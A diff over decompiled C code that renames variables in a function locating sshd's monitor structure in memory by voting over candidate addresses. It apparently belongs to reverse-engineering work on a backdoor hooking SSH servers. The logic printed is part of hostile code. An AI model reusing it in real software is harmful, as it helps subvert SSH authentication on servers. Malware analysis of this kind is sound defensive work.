@@ -19,8 +19,8 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
 {
   u8 *code_start;
   BOOL BVar1;
-  u8 *data_start_00;
-  u8 *data_end_00;
+  u8 *data_start;
+  u8 *data_end;
   ulong uVar2;
   uint uVar3;
   long lVar4;
@@ -29,49 +29,43 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
   void **ppvVar7;
   uint *puVar8;
   byte bVar9;
-  uint monitor_vote_table [20];
-  void *monitor_candidates [10];
-  uint monitor_field_hits [10];
-  u8 *data_start;
-  u8 *data_end;
-  u64 data_segment_size;
-  uint local_c8 [20];
-  void *local_78 [10];
+  u64 local_d0;
+  uint monitor_vote_table[20];
+  void *monitor_candidates[10];
   
   bVar9 = 0;
   BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
-  if ((BVar1 != FALSE) &&
-     (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
+  if ((BVar1 != FALSE) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
     ctx->struct_monitor_ptr_address = (monitor **)0x0;
-    data_start_00 = (u8 *)elf_get_data_segment(elf,&data_segment_size,FALSE);
-    if (data_start_00 != (u8 *)0x0) {
+    data_start = (u8 *)elf_get_data_segment(elf,&local_d0,FALSE);
+    if (data_start != (u8 *)0x0) {
       lVar6 = 0;
-      data_end_00 = data_start_00 + data_segment_size;
-      local_c8[0] = 4;
-      local_c8[1] = 5;
-      local_c8[2] = 6;
-      local_c8[3] = 7;
-      local_c8[4] = 8;
-      local_c8[5] = 9;
-      local_c8[6] = 10;
-      local_c8[7] = 0xb;
-      local_c8[8] = 0xc;
-      local_c8[9] = 0xd;
-      ppvVar7 = local_78;
+      data_end = data_start + local_d0;
+      monitor_vote_table[0] = 4;
+      monitor_vote_table[1] = 5;
+      monitor_vote_table[2] = 6;
+      monitor_vote_table[3] = 7;
+      monitor_vote_table[4] = 8;
+      monitor_vote_table[5] = 9;
+      monitor_vote_table[6] = 10;
+      monitor_vote_table[7] = 0xb;
+      monitor_vote_table[8] = 0xc;
+      monitor_vote_table[9] = 0xd;
+      ppvVar7 = monitor_candidates;
       for (lVar4 = 0x14; lVar4 != 0; lVar4 = lVar4 + -1) {
         *(undefined4 *)ppvVar7 = 0;
         ppvVar7 = (void **)((long)ppvVar7 + (ulong)bVar9 * -8 + 4);
       }
       do {
-        code_start = (u8 *)refs->entries[local_c8[lVar6]].func_start;
+        code_start = (u8 *)refs->entries[monitor_vote_table[lVar6]].func_start;
         if (code_start != (u8 *)0x0) {
           sshd_find_monitor_field_addr_in_function
-                    (code_start,(u8 *)refs->entries[local_c8[lVar6]].func_end,data_start_00,
-                     data_end_00,local_78 + lVar6,ctx);
+                    (code_start,(u8 *)refs->entries[monitor_vote_table[lVar6]].func_end,data_start,data_end,
+                     monitor_candidates + lVar6,ctx);
         }
         lVar6 = lVar6 + 1;
       } while (lVar6 != 10);
-      puVar8 = local_c8 + 10;
+      puVar8 = monitor_vote_table + 10;
       for (lVar4 = 10; lVar4 != 0; lVar4 = lVar4 + -1) {
         *puVar8 = 0;
         puVar8 = puVar8 + (ulong)bVar9 * -2 + 1;
@@ -82,13 +76,13 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
         do {
           uVar5 = uVar2 & 0xffffffff;
           if ((uint)lVar4 <= (uint)uVar2) {
-            local_c8[lVar4 + 10] = local_c8[lVar4 + 10] + 1;
+            monitor_vote_table[lVar4 + 10] = monitor_vote_table[lVar4 + 10] + 1;
             goto LAB_00103f07;
           }
-          ppvVar7 = local_78 + uVar2;
+          ppvVar7 = monitor_candidates + uVar2;
           uVar2 = uVar2 + 1;
-        } while (*ppvVar7 != local_78[lVar4]);
-        local_c8[uVar5 + 10] = local_c8[uVar5 + 10] + 1;
+        } while (*ppvVar7 != monitor_candidates[lVar4]);
+        monitor_vote_table[uVar5 + 10] = monitor_vote_table[uVar5 + 10] + 1;
 LAB_00103f07:
         lVar4 = lVar4 + 1;
       } while (lVar4 != 10);
@@ -96,14 +90,14 @@ LAB_00103f07:
       uVar5 = 0;
       uVar3 = 0;
       do {
-        if (uVar3 < local_c8[uVar2 + 10]) {
+        if (uVar3 < monitor_vote_table[uVar2 + 10]) {
           uVar5 = uVar2 & 0xffffffff;
-          uVar3 = local_c8[uVar2 + 10];
+          uVar3 = monitor_vote_table[uVar2 + 10];
         }
         uVar2 = uVar2 + 1;
       } while (uVar2 != 10);
-      if ((4 < uVar3) && ((monitor **)local_78[uVar5] != (monitor **)0x0)) {
-        ctx->struct_monitor_ptr_address = (monitor **)local_78[uVar5];
+      if ((4 < uVar3) && ((monitor **)monitor_candidates[uVar5] != (monitor **)0x0)) {
+        ctx->struct_monitor_ptr_address = (monitor **)monitor_candidates[uVar5];
         return TRUE;
       }
     }
